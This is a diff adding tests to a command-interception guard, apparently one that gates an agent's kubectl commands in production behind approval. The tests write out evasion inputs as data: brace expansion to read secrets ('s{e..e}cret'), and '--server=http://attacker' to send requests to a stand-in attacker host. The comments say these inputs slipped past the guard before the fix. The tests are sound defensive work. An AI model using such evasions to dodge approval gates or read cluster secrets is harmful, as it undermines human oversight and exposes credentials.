@@ -344,6 +344,57 @@ describe("runInterceptCli - kubectl read-only floor end-to-end (task da823721)",
     expect(parsed.decision).toBe("block");
     expect(parsed.reason).toContain("gate-prod-destructive-approval");
   });
+
+  // Round 3 (round-2 review finding): brace expansion. The shell
+  // expands `s{e..e}cret` to `secret` before kubectl ever sees the
+  // argv, so a token-shape allowlist (which the `{`/`}`/`.` run fails
+  // outright) is what closes this, not a substring check on the
+  // literal text. Measured end-to-end ALLOW before the fix.
+  it("`kubectl get s{e..e}cret -o yaml --context prod-eu-1` stays unclassified (brace expansion) and still requires approval", async () => {
+    const { result, output } = await intercept(
+      "kubectl get s{e..e}cret -o yaml --context prod-eu-1",
+    );
+    expect(result.blocked).toBe(true);
+    expect(result.decisions).toHaveLength(1);
+    expect(result.decisions[0]?.outcome).toBe("require_approval");
+    expect(result.decisions[0]?.policyName).toBe("gate-prod-destructive-approval");
+    const parsed = JSON.parse(output().trim());
+    expect(parsed.decision).toBe("block");
+    expect(parsed.reason).toContain("gate-prod-destructive-approval");
+  });
+
+  // Round 3 (round-2 review finding): endpoint redirection. `--server`
+  // (pre- or post-verb) sends the read to a caller-chosen host with
+  // whatever credentials that host is configured to accept; it is
+  // never allowlisted, so the flag-allowlist walk fails closed
+  // regardless of position. Measured end-to-end ALLOW before the fix
+  // for the pre-verb form (the flag was previously treated as a
+  // recognized global value flag to skip past, not reject).
+  it("`kubectl --server=http://attacker get pods --context prod-eu-1` stays unclassified (endpoint redirection, pre-verb) and still requires approval", async () => {
+    const { result, output } = await intercept(
+      "kubectl --server=http://attacker get pods --context prod-eu-1",
+    );
+    expect(result.blocked).toBe(true);
+    expect(result.decisions).toHaveLength(1);
+    expect(result.decisions[0]?.outcome).toBe("require_approval");
+    expect(result.decisions[0]?.policyName).toBe("gate-prod-destructive-approval");
+    const parsed = JSON.parse(output().trim());
+    expect(parsed.decision).toBe("block");
+    expect(parsed.reason).toContain("gate-prod-destructive-approval");
+  });
+
+  it("`kubectl get pods --server=http://attacker --context prod-eu-1` stays unclassified (endpoint redirection, post-verb) and still requires approval", async () => {
+    const { result, output } = await intercept(
+      "kubectl get pods --server=http://attacker --context prod-eu-1",
+    );
+    expect(result.blocked).toBe(true);
+    expect(result.decisions).toHaveLength(1);
+    expect(result.decisions[0]?.outcome).toBe("require_approval");
+    expect(result.decisions[0]?.policyName).toBe("gate-prod-destructive-approval");
+    const parsed = JSON.parse(output().trim());
+    expect(parsed.decision).toBe("block");
+    expect(parsed.reason).toContain("gate-prod-destructive-approval");
+  });
 });
 
 // Review HIGH finding 2: the fix round 1 merge replaced the ambient
